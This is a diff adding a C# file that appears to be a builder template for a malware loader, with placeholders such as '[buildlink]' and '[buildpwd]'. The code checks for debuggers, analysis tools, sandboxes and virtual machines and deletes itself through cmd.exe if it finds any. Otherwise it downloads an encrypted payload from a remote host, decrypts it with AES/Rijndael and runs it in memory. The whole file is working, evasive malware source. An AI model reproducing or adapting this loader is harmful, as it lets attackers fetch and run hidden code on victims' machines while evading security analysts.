@@ -1,0 +1,161 @@
+using System;
+using System.IO;
+
+class TRON_MAIN
+{
+    static void Main()
+    {
+        try
+        {
+            var TRON_antivm = new System.Threading.Thread(TRON_antis.TRON_emul);
+            TRON_antivm.Start();
+            TRON_antivm.Join();
+
+            try
+            {
+                if (!System.IO.File.Exists(Environment.GetEnvironmentVariable("programdata") + "\\[sqlitename].dll"))
+                    System.Reflection.Assembly.Load(TRON_decrypt()).EntryPoint.Invoke(null, null);
+            }
+            catch 
+            {
+            }
+
+
+            TRON_helper.TRON_del();
+        }
+        catch
+        {
+            TRON_helper.TRON_del();
+        }
+
+    }
+
+    static byte[] TRON_decrypt()
+    {
+        var TRON_s8 = new System.Net.WebClient().DownloadData("[buildlink]");
+        var TRON_s10 = System.Security.Cryptography.Rijndael.Create().CreateDecryptor(new System.Security.Cryptography.PasswordDeriveBytes("[buildpwd]", null).GetBytes(16), new byte[16]);
+        var TRON_s11 = new System.IO.MemoryStream();
+        var TRON_s12 = new System.Security.Cryptography.CryptoStream(TRON_s11, TRON_s10, System.Security.Cryptography.CryptoStreamMode.Write);
+        TRON_s12.Write(TRON_s8, 0, TRON_s8.Length);
+        TRON_s12.FlushFinalBlock();
+        return TRON_s11.ToArray();
+    }
+
+}
+
+class TRON_helper
+{
+    public static void TRON_del()
+    {
+        var TRON_s15 = new System.Diagnostics.ProcessStartInfo();
+        TRON_s15.Arguments = "/C timeout /T 2 & choice /C Y /N /D Y /T 3 & Del \"" + System.Reflection.Assembly.GetEntryAssembly().Location + "\"";
+        TRON_s15.CreateNoWindow = true;
+        TRON_s15.UseShellExecute = false;
+        TRON_s15.FileName = "cmd.exe";
+        System.Diagnostics.Process.Start(TRON_s15);
+        Environment.Exit(0);
+    }
+}
+
+
+class TRON_antis
+{
+    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
+    public static extern IntPtr GetModuleHandle(string TRON_s11);
+
+    public static void TRON_emul()
+    {
+        try
+        {
+            TRON_processes();
+            TROM_modules();
+            TRON_wmi();
+        }
+        catch
+        {
+            TRON_helper.TRON_del();
+        }
+
+    }
+
+    static void TRON_processes()
+    {
+        try
+        {
+            foreach (var TRON_item in System.Diagnostics.Process.GetProcesses())
+            {
+                if (TRON_item.ProcessName.ToLower() == "procexp64" || TRON_item.ProcessName.ToLower() == "procexp"
+                    || TRON_item.ProcessName.ToLower() == "processhacker" || TRON_item.ProcessName.ToLower() == "wireshark"
+                    || TRON_item.ProcessName.ToLower() == "fiddler" || TRON_item.ProcessName.ToLower() == "outpost"
+                    || TRON_item.ProcessName.ToLower() == "vboxservice" || TRON_item.ProcessName.ToLower() == "vboxtray"
+                    || TRON_item.ProcessName.ToLower() == "vmtoolsd" || TRON_item.ProcessName.ToLower() == "vgauthservice"
+                    || TRON_item.ProcessName.ToLower() == "vmsrvc" || TRON_item.ProcessName.ToLower() == "vmusrvc"
+                    || TRON_item.ProcessName.ToLower() == "prl_cc" || TRON_item.ProcessName.ToLower() == "prl_tools"
+                    || TRON_item.ProcessName.ToLower() == "xenservice" || TRON_item.ProcessName.ToLower() == "qemu-ga"
+                    || TRON_item.ProcessName.ToLower() == "ollydbg" || TRON_item.ProcessName.ToLower() == "tcpview"
+                    || TRON_item.ProcessName.ToLower() == "ida" || TRON_item.ProcessName.ToLower() == "hookexplorer"
+                    || TRON_item.ProcessName.ToLower() == "sysinspector" || TRON_item.ProcessName.ToLower() == "proc_analyzer"
+                    || TRON_item.ProcessName.ToLower() == "joeboxcontrol" || TRON_item.ProcessName.ToLower() == "sample")
+                    TRON_helper.TRON_del();
+            }
+        }
+        catch
+        {
+            TRON_helper.TRON_del();
+        }
+
+    }
+
+    static void TROM_modules()
+    {
+        try
+        {
+            string[] TRON_s9 = { "cmdvrt32.dll", "SxIn.dll", "SbieDll.dll", "vmcheck.dll" };
+
+            foreach (var TRON_i in TRON_s9)
+            {
+                if (GetModuleHandle(TRON_i).ToInt32() != 0)
+                    TRON_helper.TRON_del();
+            }
+        }
+        catch
+        {
+            TRON_helper.TRON_del();
+        }
+    }
+
+    static void TRON_wmi()
+    {
+        try
+        {
+            using (var TRON_s14 = new System.Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
+            {
+                using (var TRON_s15 = TRON_s14.Get())
+                {
+                    foreach (var TRON_s16 in TRON_s15)
+                    {
+                        var TRON_s17 = TRON_s16["Manufacturer"].ToString().ToLower();
+                        var TRON_s18 = TRON_s16["Model"].ToString().ToLower();
+
+                        if (TRON_s18.Contains("virtual")
+                            || TRON_s18.Contains("vbox")
+                            || TRON_s18.Contains("vmware")
+                            || TRON_s18.Contains("oracle")
+                            || TRON_s17.Contains("virtual")
+                            || TRON_s17.Contains("vmware")
+                            || TRON_s17.Contains("vbox")
+                            || TRON_s17.Contains("oracle")
+                            || TRON_s17.Contains("microsoft corporation"))
+                        {
+                            TRON_helper.TRON_del();
+                        }
+                    }
+                }
+            }
+        }
+        catch
+        {
+            TRON_helper.TRON_del();
+        }
+    }
+}
